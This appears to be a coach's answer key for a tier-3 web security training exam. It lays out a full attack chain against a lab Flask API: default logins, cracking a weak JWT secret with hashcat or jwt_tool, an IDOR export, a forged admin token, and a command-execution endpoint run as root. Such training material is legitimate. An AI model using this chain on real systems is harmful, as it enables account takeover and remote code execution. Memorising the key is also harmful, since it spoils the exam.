Quest: web-t3-exam (tier 3 EXAM, web-appsec)

Ground truth for the coach:
- flask api on :80, systemd unit pentrain-api runs as root
- POST /api/login guest/guest123 (also svc-report/Report2024!) → HS256 JWT
- JWT_SECRET = "supersecret" — hashcat -m 16500 / jwt_tool -C / john
- IDOR: GET /api/users/1/export with ANY valid token → admin's export
  serves /var/lib/api/user-flag.txt (flag A)
- forge {"sub":"admin","uid":1,"admin":true} signed with cracked secret →
  GET /api/admin/report → /var/lib/api/admin-flag.txt (flag B)
- GET /api/admin/exec?cmd=cat+/flag.txt → root RCE (flag C)

This is an EXAM — coach at the stage level:
- Chain discipline: login → inspect token → IDOR → crack → forge → admin.
- Redirect to web-t3-jwt-idor for JWT/IDOR mechanics if stuck.

Wrong turns: algonone attacks (the lib requires HS256 signature — crack
the secret instead), fuzzing uids forever (1 is the target), trying to
exec without a forged admin token (403 admin required).
